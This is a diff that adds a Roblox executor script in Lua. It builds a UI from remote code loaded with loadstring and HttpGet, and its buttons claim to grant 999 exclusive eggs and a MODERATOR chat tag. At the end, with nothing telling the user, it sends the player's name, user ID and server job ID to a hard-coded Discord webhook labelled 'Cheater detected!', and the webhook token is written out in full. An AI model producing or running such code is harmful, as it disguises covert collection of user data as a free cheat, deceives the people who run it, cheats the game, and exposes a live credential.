@@ -1,0 +1,123 @@
+local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+
+local Window = Fluent:CreateWindow({
+    Title = "Fluent Example",
+    SubTitle = "Custom Buttons",
+    TabWidth = 45,
+    Size = UDim2.fromOffset(400, 400),
+    Acrylic = true,
+    Theme = "Dark"
+})
+
+local Tabs = {
+    Main = Window:AddTab({ Title = "Main" })
+}
+
+-- Button: Free x999 Exclusive Egg
+Tabs.Main:AddButton({
+    Title = "Free x999 Exclusive Egg",
+    Description = "Click to set Exclusive Overseer Egg to x999",
+    Callback = function()
+        local player = game:GetService("Players").LocalPlayer
+        if player and player:FindFirstChild("Data") and player.Data:FindFirstChild("Eggs") then
+            local eggsFolder = player.Data.Eggs
+            if eggsFolder:FindFirstChild("Exclusive Overseer Egg") then
+                eggsFolder["Exclusive Overseer Egg"].Value = 999
+                Fluent:Notify({
+                    Title = "Success",
+                    Content = "Exclusive Overseer Egg given check inventory!",
+                    Duration = 5
+                })
+            else
+                Fluent:Notify({
+                    Title = "Error",
+                    Content = "Exclusive Overseer Egg not found in Eggs folder!",
+                    Duration = 5
+                })
+            end
+        else
+            Fluent:Notify({
+                Title = "Error",
+                Content = "Player data not found!",
+                Duration = 5
+            })
+        end
+    end
+})
+
+-- Button: Get Free MODERATOR CHAT TAG
+Tabs.Main:AddButton({
+    Title = "Get Free MODERATOR CHAT TAG",
+    Description = "Click to set ChatTag to MODERATOR",
+    Callback = function()
+        local player = game:GetService("Players").LocalPlayer
+        if player and player:FindFirstChild("Data") and player.Data:FindFirstChild("CustomChatTag") then
+            player.Data.CustomChatTag.Value = "MODERATOR"
+            Fluent:Notify({
+                Title = "Success",
+                Content = "ChatTag set to MODERATOR!",
+                Duration = 5
+            })
+        else
+            Fluent:Notify({
+                Title = "Error",
+                Content = "CustomChatTag not found in Player Data!",
+                Duration = 5
+            })
+        end
+    end
+})
+
+Window:SelectTab(1)
+
+local OSTime = os.time()
+local Time = os.date('!*t', OSTime)
+
+-- Player Info
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local PlayerID = LocalPlayer.UserId
+local PlayerName = LocalPlayer.Name
+
+-- Webhook Setup
+local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png'
+local Content = 'Cheater detected! '
+local Embed = {
+    title = 'Execution Info',
+    color = 99999,
+    footer = { text = "Game Job ID: " .. game.JobId },
+    author = {
+        name = 'Exploiter user took',
+        url = 'https://www.roblox.com/',
+    },
+    fields = {
+        {
+            name = 'Player Name',
+            value = PlayerName,
+            inline = true
+        },
+        {
+            name = 'Player ID',
+            value = tostring(PlayerID),
+            inline = true
+        },
+        {
+            name = 'Message',
+            value = 'The script has been executed by the player!',
+        }
+    },
+    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
+}
+
+-- Send Webhook
+(syn and syn.request or http_request) {
+    Url = 'https://discord.com/api/webhooks/1329941179051147424/K-zDwwssbogTuBQBGcl7z6x0qh5DuYf36E6IVnYRORmI_enV7nIIRm8mqKuzr-nX_vtp',
+    Method = 'POST',
+    Headers = {
+        ['Content-Type'] = 'application/json'
+    },
+    Body = game:GetService("HttpService"):JSONEncode({
+        content = Content,
+        embeds = { Embed }
+    }),
+}
